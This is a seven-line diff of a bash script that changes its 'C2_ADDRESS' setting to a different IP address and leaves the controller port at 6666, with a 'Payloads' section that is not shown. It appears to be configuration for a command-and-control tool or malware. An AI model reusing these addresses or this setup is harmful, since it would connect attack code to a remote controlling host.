@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Configuration
-C2_ADDRESS="134.255.234.140"
+C2_ADDRESS="160.176.141.0"
 C2_PORT=6666
 
 # Payloads
